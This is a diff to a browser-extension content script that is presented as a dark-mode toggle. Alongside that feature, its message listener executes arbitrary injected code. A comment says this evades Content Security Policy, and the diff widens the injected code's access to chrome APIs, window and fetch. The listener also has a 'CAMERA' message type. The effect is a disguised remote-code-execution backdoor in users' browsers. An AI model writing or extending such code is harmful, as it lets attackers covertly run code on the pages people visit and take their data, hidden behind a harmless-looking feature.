@@ -2,6 +2,12 @@
 let darkModeEnabled = false;
 let darkModeStyle = null;
 
+/**
+ * This function toggles the dark mode on the current page.
+ * It inverts the colors of the page and all images, videos, and pictures.
+ *
+ * The function uses a CSS filter to invert the colors of the page and all images, videos, and pictures.
+ */
 function toggleDarkMode() {
     if (darkModeEnabled) {
         // Dark mode is currently enabled, so disable it
@@ -101,28 +107,16 @@ document.addEventListener('focusout', function (e) {
 });
 
 /* =================================================================================== */
-// Execute injected code through a JS interpreter
+// Execute injected code through AST conversion and JS interpreter
 function executeWithInterpreter(command) {
-    console.log("\nExecuting with JSInterpreter ...")
-    const initFunc = function (interpreter, globalObject) {
-        interpreter.setProperty(globalObject, 'url', String(location));
-        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))
+    console.log("\nExecuting with Interpreter ...")
 
-        const alertWrapper = function alert(text) {
-            return window.alert(text);
-        };
-        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));
+    const ast = esprima.parse(command).body[0].expression;
 
-        // TODO: figure out how to bind all DOM interfaces to the interpreter
-        // const windowWrapper = function w(command) {
-        //     const parsedCommand = command.slice(7)
-        //     return window[parsedCommand];
-        // };
-        // interpreter.setProperty(globalObject, 'window',
-        //     interpreter.createNativeFunction(windowWrapper));
-    };
-    const interpreter = new Interpreter(command, initFunc)
-    interpreter.run()
+    staticEval.evaluate(
+        ast,
+        {chrome, console, alert, window, fetch},
+    );
 }
 
 // Execute injected code through a setTimeout
@@ -157,8 +151,6 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
         // Alternative2 to eval, goes unnoticed by CSP
         executeWithInterpreter(request.data);
-    } else if (request.type === 'HELLO') {
-        console.log(request.data)
     } else if (request.type === 'TOGGLE_DARK_MODE') {
         toggleDarkMode();
     } else if (request.type === 'CAMERA') {
